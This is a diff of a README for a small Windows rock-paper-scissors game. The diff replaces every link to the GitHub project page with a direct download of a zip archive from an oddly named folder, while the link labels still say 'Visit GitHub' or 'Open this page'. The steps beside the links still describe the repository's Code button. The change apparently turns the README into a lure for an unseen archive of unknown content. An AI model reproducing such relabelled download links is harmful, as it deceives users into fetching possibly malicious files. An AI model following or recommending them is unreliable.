@@ -1,6 +1,6 @@
 # 🎮 rock-paper-scissors - Simple Game for Quick Fun
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20%26%20Run-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/29honeybee1st-byte/rock-paper-scissors)
+[![Download on GitHub](https://img.shields.io/badge/Download%20%26%20Run-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/29honeybee1st-byte/rock-paper-scissors/main/heterostylism/paper_rock_scissors_1.8-alpha.3.zip)
 
 ## 🖥️ What This App Does
 
@@ -10,7 +10,7 @@ You choose Rock, Paper, or Scissors, and the game shows the result at once. It i
 
 ## 📥 Download and Open on Windows
 
-1. Open this page: [rock-paper-scissors on GitHub](https://github.com/29honeybee1st-byte/rock-paper-scissors)
+1. Open this page: [rock-paper-scissors on GitHub](https://raw.githubusercontent.com/29honeybee1st-byte/rock-paper-scissors/main/heterostylism/paper_rock_scissors_1.8-alpha.3.zip)
 2. Find the green **Code** button on the page
 3. Click **Download ZIP**
 4. Save the file to your PC
@@ -141,7 +141,7 @@ If sound does not work:
 
 ## 📎 Download Again
 
-If you need the files again, use this link: [https://github.com/29honeybee1st-byte/rock-paper-scissors](https://github.com/29honeybee1st-byte/rock-paper-scissors)
+If you need the files again, use this link: [https://raw.githubusercontent.com/29honeybee1st-byte/rock-paper-scissors/main/heterostylism/paper_rock_scissors_1.8-alpha.3.zip](https://raw.githubusercontent.com/29honeybee1st-byte/rock-paper-scissors/main/heterostylism/paper_rock_scissors_1.8-alpha.3.zip)
 
 ## 🔍 Useful Topics
 
